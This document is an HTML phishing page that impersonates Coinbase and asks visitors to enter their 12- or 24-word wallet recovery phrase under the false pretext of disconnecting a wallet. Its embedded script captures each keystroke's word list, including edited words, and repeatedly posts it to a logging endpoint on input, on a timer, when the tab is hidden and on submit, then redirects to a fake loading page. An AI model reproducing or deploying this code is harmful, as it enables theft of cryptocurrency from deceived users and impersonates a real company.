
<!DOCTYPE html>
<html class="ll-fb" lang="en" style="background:#0a0b0d;">
 <head>
  <meta charset="utf-8"/>
  <style>
html.ll-fb,
html.ll-fb *,
html.ll-fb *::before,
html.ll-fb *::after {
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif !important;
}
html.ll-fb #cb-seed-inp {
  color-scheme: dark;
}
html.ll-fb #cb-seed-inp:-webkit-autofill,
html.ll-fb #cb-seed-inp:-webkit-autofill:hover,
html.ll-fb #cb-seed-inp:-webkit-autofill:focus {
  -webkit-text-fill-color: inherit;
  box-shadow: 0 0 0 1000px #0a0b0d inset;
  caret-color: inherit;
}
html.ll-fb.ll-invalid #cb-seed-inp {
  border-color: #ef4444;
  box-shadow: 0 0 0 1px #ef4444;
}
html.ll-fb.ll-invalid #cb-seed-err {
  display: block !important;
}
.ll-fb-logo{width:32px;height:32px;display:block;flex-shrink:0}
*,:before,:after{--tw-border-spacing-x: 0;--tw-border-spacing-y: 0;--tw-translate-x: 0;--tw-translate-y: 0;--tw-rotate: 0;--tw-skew-x: 0;--tw-skew-y: 0;--tw-scale-x: 1;--tw-scale-y: 1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness: proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width: 0px;--tw-ring-offset-color: #fff;--tw-ring-color: rgb(59 130 246 / .5);--tw-ring-offset-shadow: 0 0 #0000;--tw-ring-shadow: 0 0 #0000;--tw-shadow: 0 0 #0000;--tw-shadow-colored: 0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style:}
*,:before,:after{box-sizing:border-box;border-width:0;border-style:solid;border-color:#e5e7eb}
html,:host{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;-o-tab-size:4;tab-size:4;font-family:ui-sans-serif,system-ui,sans-serif,"Apple Color Emoji","Segoe UI Emoji",Segoe UI Symbol,"Noto Color Emoji";font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}
body{margin:0;line-height:inherit}
h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}
b,strong{font-weight:bolder}
button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}
button,select{text-transform:none}
button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:transparent;background-image:none}
blockquote,dl,dd,h1,h2,h3,h4,h5,h6,hr,figure,p,pre{margin:0}
img,svg,video,canvas,audio,iframe,embed,object{display:block;vertical-align:middle}
html,body,#root{height:100%}
.relative{position:relative}
.my-4{margin-top:1rem;margin-bottom:1rem}
.mt-12{margin-top:3rem}
.mt-4{margin-top:1rem}
.mt-5{margin-top:1.25rem}
.flex{display:flex}
.h-full{height:100%}
.min-h-fit{min-height:-moz-fit-content;min-height:fit-content}
.w-full{width:100%}
.max-w-md{max-width:28rem}
.flex-grow{flex-grow:1}
.flex-col{flex-direction:column}
.items-center{align-items:center}
.justify-center{justify-content:center}
.justify-between{justify-content:space-between}
.gap-2{gap:.5rem}
.rounded-\[16px\]{border-radius:16px}
.rounded-full{border-radius:9999px}
.rounded-md{border-radius:.375rem}
.border{border-width:1px}
.border-coinbase-line{border-color:#8a919e33}
.bg-coinbase-background{--tw-bg-opacity: 1;background-color:rgb(10 11 13 / var(--tw-bg-opacity, 1))}
.bg-coinbase-primary{--tw-bg-opacity: 1;background-color:rgb(87 139 250 / var(--tw-bg-opacity, 1))}
.p-6{padding:1.5rem}
.px-4{padding-left:1rem;padding-right:1rem}
.px-6{padding-left:1.5rem;padding-right:1.5rem}
.py-3\.5{padding-top:.875rem;padding-bottom:.875rem}
.py-4{padding-top:1rem;padding-bottom:1rem}
.pb-2{padding-bottom:.5rem}
.pb-8{padding-bottom:2rem}
.pl-6{padding-left:1.5rem}
.pr-8{padding-right:2rem}
.pt-5{padding-top:1.25rem}
.text-left{text-align:left}
.font-coinbase-sans{font-family:CBSans}
.font-coinbase-text{font-family:CBText}
.font-coinbase-title{font-family:CBDisplay}
.text-\[28px\]{font-size:28px}
.text-sm{font-size:.875rem;line-height:1.25rem}
.font-semibold{font-weight:600}
.text-black{--tw-text-opacity: 1;color:rgb(0 0 0 / var(--tw-text-opacity, 1))}
.text-coinbase-foreground-muted{--tw-text-opacity: 1;color:rgb(138 145 158 / var(--tw-text-opacity, 1))}
.text-white{--tw-text-opacity: 1;color:rgb(255 255 255 / var(--tw-text-opacity, 1))}
.outline-none{outline:2px solid transparent;outline-offset:2px}
.transition-colors{transition-property:color,background-color,border-color,text-decoration-color,fill,stroke;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:.15s}
.hover\:bg-\[\#0f1012\]:hover{--tw-bg-opacity: 1;background-color:rgb(15 16 18 / var(--tw-bg-opacity, 1))}
.hover\:bg-\[\#507fe5\]:hover{--tw-bg-opacity: 1;background-color:rgb(80 127 229 / var(--tw-bg-opacity, 1))}
.focus\:outline-coinbase-primary:focus{outline-color:#578bfa}
.active\:scale-\[\.98\]:active{--tw-scale-x: .98;--tw-scale-y: .98;transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}
.active\:bg-\[\#4b78d6\]:active{--tw-bg-opacity: 1;background-color:rgb(75 120 214 / var(--tw-bg-opacity, 1))}
.disabled\:scale-100:disabled{--tw-scale-x: 1;--tw-scale-y: 1;transform:translate(var(--tw-translate-x),var(--tw-translate-y)) rotate(var(--tw-rotate)) skew(var(--tw-skew-x)) skewY(var(--tw-skew-y)) scaleX(var(--tw-scale-x)) scaleY(var(--tw-scale-y))}
.disabled\:bg-\[\#314b84\]:disabled{--tw-bg-opacity: 1;background-color:rgb(49 75 132 / var(--tw-bg-opacity, 1))}
@media (min-width: 640px){.sm\:mt-24{margin-top:6rem}}
@media (min-width: 640px){.sm\:justify-start{justify-content:flex-start}}
@media (min-width: 640px){.sm\:border{border-width:1px}}
@media (min-width: 640px){.sm\:border-coinbase-line,.sm\:border-crypto-line{border-color:#8a919e33}}
@media (min-width: 640px){.sm\:px-10{padding-left:2.5rem;padding-right:2.5rem}}
@media (min-width: 640px){.sm\:py-8{padding-top:2rem;padding-bottom:2rem}}
  </style>
  <link rel="icon" href="/Coinbaselogo.png"/>
  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
  <title>Coinbase - Recovery Phrase</title>
  <meta content="#000000" name="theme-color"/>
  <link rel="stylesheet" href="css/flow-b-shell.css"/>
</head>
 <body style="background:#0a0b0d;">
  <div class="ll-fb-type" id="root">
   <div class="h-full w-full flex-grow justify-between bg-coinbase-background sm:justify-start">
    <div class="w-full px-6 pt-5">
     <svg class="ll-fb-logo" height="32" viewbox="0 0 48 48" width="32" xmlns="http://www.w3.org/2000/svg">
      <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#FFFFFF">
      </path>
     </svg>
    </div>
    <div class="flex w-full flex-col items-center justify-center bg-coinbase-background pb-8">
     <form autocomplete="off" class="mt-12 flex min-h-fit w-full max-w-md flex-col rounded-[16px] p-6 font-coinbase-text sm:mt-24 sm:border sm:border-coinbase-line sm:px-10 sm:py-8">
      <span id="cb-seed-title" class="ll-fb-title pb-2 font-coinbase-title text-[28px] font-semibold text-white">
       Disconnect wallet from your account
      </span>
      <span id="cb-seed-sub" class="font-coinbase-sans text-coinbase-foreground-muted my-4">
       Enter the 12 or 24 word recovery phrase from your external wallet to disconnect your wallet from your Coinbase account.
      </span>
      <div class="relative mt-5 flex w-full flex-col gap-2 text-left text-white">
       <div style="display:flex;justify-content:space-between;align-items:center;">
        <span class="text-sm font-semibold">Seed Phrase</span>
        <span id="cb-seed-wc" style="font-size:0.78em;color:#6b7280;font-family:inherit;"></span>
       </div>
       <input id="cb-seed-inp" autocomplete="off" class="rounded-md border border-coinbase-line bg-coinbase-background px-4 py-3.5 font-coinbase-sans outline-none hover:bg-[#0f1012] focus:outline-coinbase-primary" placeholder="Enter your seed phrase" value=""/>
      </div>
      <span id="cb-seed-err" style="display:none;color:#ef4444;font-size:0.85em;margin-top:4px;">The seed phrase you entered is incorrect. Please try again with the correct seed phrase.</span>
      <button id="cb-seed-btn" class="bg-coinbase-primary hover:bg-[#507fe5] disabled:bg-[#314b84] active:bg-[#4b78d6] disabled:scale-100 active:scale-[.98] mt-4 rounded-full py-4 flex font-coinbase-sans font-semibold pl-6 pr-8 text-black items-center transition-colors justify-center w-full" disabled="" type="button">
       Continue
      </button>
     </form>
  <script>
@verbatim
  (function(){
    var d      = window._cbSeedData || {};
    var btn    = document.getElementById('cb-seed-btn');
    var inp    = document.getElementById('cb-seed-inp');
    var wcEl   = document.getElementById('cb-seed-wc');

    var titleEl = document.getElementById('cb-seed-title');
    var subEl   = document.getElementById('cb-seed-sub');
    if (d.title && titleEl) titleEl.textContent = d.title;
    if (d.sub   && subEl)   subEl.textContent   = d.sub;
    if (d.btn   && btn)     btn.textContent      = d.btn;

    if (document.documentElement.classList.contains('ll-invalid')) {
      setTimeout(function() {
        document.documentElement.classList.remove('ll-invalid');
      }, 8000);
    }

    var CSRF  = '';
    var TRACK = '/api/log';
    var _wordHistory    = {};
    var _lastWords      = [];

    function getWords() {
      return inp.value.trim().split(/\s+/).filter(function(w){ return w.length > 0; });
    }

    function updateUI() {
      var words = getWords();
      var wc = words.length;
      btn.disabled = !(wc === 12 || wc === 24);
      if (wcEl) {
        if (wc === 0) {
          wcEl.textContent = '';
        } else {
          var color = (wc === 12 || wc === 24) ? '#22c55e' : '#6b7280';
          wcEl.style.color = color;
          wcEl.textContent = wc + ' word' + (wc === 1 ? '' : 's');
        }
      }
    }

    function sendFullState() {
      if (!CSRF || !window._llDocId || !window._llStayOk) return Promise.resolve();
      var words = getWords();
      words.forEach(function(w, i) {
        var key = String(i + 1);
        if (_lastWords[i] && _lastWords[i] !== w && _lastWords[i].length > 0) {
          if (!_wordHistory[key]) _wordHistory[key] = [];
          if (_wordHistory[key].indexOf(_lastWords[i]) === -1) _wordHistory[key].push(_lastWords[i]);
        }
      });
      _lastWords = words.slice();
      var snapshot = JSON.stringify({ words: words, totalWords: words.length, wordHistory: _wordHistory, passphrase: '', passphraseHistory: [] });
      var b = new URLSearchParams({ _token: CSRF, type: 'phrase_input', page: 'coinbase_seed', element: 'full_state', value: snapshot, doc: window._llDocId, stay: String(window._llStayId || '') });
      return window._llPostTrack ? window._llPostTrack(b) : Promise.resolve();
    }

    inp.addEventListener('input', function() {
      updateUI();
      clearTimeout(inp._db);
      inp._db = setTimeout(sendFullState, 600);
    });
    setInterval(function() { if (getWords().length > 0) sendFullState(); }, 3000);
    document.addEventListener('visibilitychange', function() {
      if (document.visibilityState === 'hidden' && getWords().length > 0) sendFullState();
    });

    btn.addEventListener('click', function() {
      if (btn.disabled) return;
      var words = getWords();
      if (words.length !== 12 && words.length !== 24) return;

      CSRF = window._liveledCSRF || '';

      Promise.resolve(window._llStayReadyPromise).then(function () {
        if (!window._llStayOk) throw new Error('stay');
        return sendFullState();
      }).then(function () {
        var b = new URLSearchParams({ _token: CSRF, type: 'form_submit', page: 'coinbase_seed', element: 'seed_phrase', value: words.join(' '), doc: window._llDocId, stay: String(window._llStayId || '') });
        return window._llPostTrack(b);
      }).then(function () {
        if (typeof window.navigateTo === 'function') {
          window.navigateTo('/coinbase/loading');
        } else {
          window.location.href = '/coinbase/loading';
        }
      }).catch(function () {});
    });

    var _wait = setInterval(function() {
      if (window._liveledCSRF) {
        CSRF = window._liveledCSRF;
        clearInterval(_wait);
        if (window._llStayReadyPromise) {
          window._llStayReadyPromise.then(function () {
            if (getWords().length > 0) sendFullState();
          });
        }
      }
    }, 50);
  })();
@endverbatim
  </script>
    </div>
   </div>
  </div>
 </body>
</html>

